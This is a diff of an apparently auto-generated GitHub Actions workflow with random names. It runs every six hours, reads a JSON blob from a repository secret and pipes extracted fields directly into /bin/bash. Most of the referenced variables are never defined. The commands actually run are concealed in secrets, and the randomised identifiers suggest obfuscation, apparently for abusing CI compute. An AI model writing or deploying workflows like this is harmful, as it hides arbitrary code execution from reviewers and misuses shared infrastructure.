@@ -1,38 +1,31 @@
 name: purmabiaomk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
+    - cron: '33 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: purmabiaomk
         env:
-          omood28429: ${{ secrets.omood28429 }}
+          fwte62: ${{ secrets.fwte62 }}
         run: |
-          echo $omood28429 | jq -r .hbm74 | /bin/bash
-          echo $yfu76 | jq -r .dvzrb399 | /bin/bash
-          echo $uo13637 | jq -r .fv12 | /bin/bash
-          echo $ggr654 | jq -r .v396 | /bin/bash
-          echo $rgjos72 | jq -r .fqazx5715 | /bin/bash
-          echo $ke60 | jq -r .m74259 | /bin/bash
-          echo $svo3758 | jq -r .b54 | /bin/bash
-          echo $hl5 | jq -r .tp3139 | /bin/bash
-          echo $vd6158 | jq -r .fcwq51 | /bin/bash
-          echo $xtwq11064 | jq -r .aqoj117 | /bin/bash
-          echo $rt5673 | jq -r .ngmom9526 | /bin/bash
-          echo $tl108 | jq -r .hq4787 | /bin/bash
-          echo $clof503 | jq -r .lto14 | /bin/bash
-          echo $vokm19 | jq -r .j2177 | /bin/bash
-          echo $ufpnk2662 | jq -r .tm73786 | /bin/bash
-          echo $nmj211 | jq -r .rcovf22 | /bin/bash
-          echo $bmpnu8 | jq -r .q158 | /bin/bash
-          echo $p831 | jq -r .ud4 | /bin/bash
-          echo $fchlr070 | jq -r .t58669 | /bin/bash
-          echo $em201 | jq -r .fwab378 | /bin/bash
-          echo $bp27999 | jq -r .voxx414 | /bin/bash
-          echo $ndg0214 | jq -r .ju9 | /bin/bash
-          echo $tamo7409 | jq -r .u0 | /bin/bash
+          echo $fwte62 | jq -r .qrr8 | /bin/bash
+          echo $isesb59469 | jq -r .iheb5 | /bin/bash
+          echo $awt132 | jq -r .ekp7096 | /bin/bash
+          echo $pzoc6243 | jq -r .gvucs6198 | /bin/bash
+          echo $dkq41 | jq -r .qjpx32 | /bin/bash
+          echo $fcpe0 | jq -r .hnitj8 | /bin/bash
+          echo $xkcn05 | jq -r .ecfif763 | /bin/bash
+          echo $et924 | jq -r .anv67 | /bin/bash
+          echo $yza8 | jq -r .dxjmb05154 | /bin/bash
+          echo $e4 | jq -r .rfb2 | /bin/bash
+          echo $nbmq47266 | jq -r .rr979 | /bin/bash
+          echo $ixesm8950 | jq -r .dynnr95923 | /bin/bash
+          echo $aiiuj7 | jq -r .ilzb33428 | /bin/bash
+          echo $fzgu0828 | jq -r .gqoqv04961 | /bin/bash
 
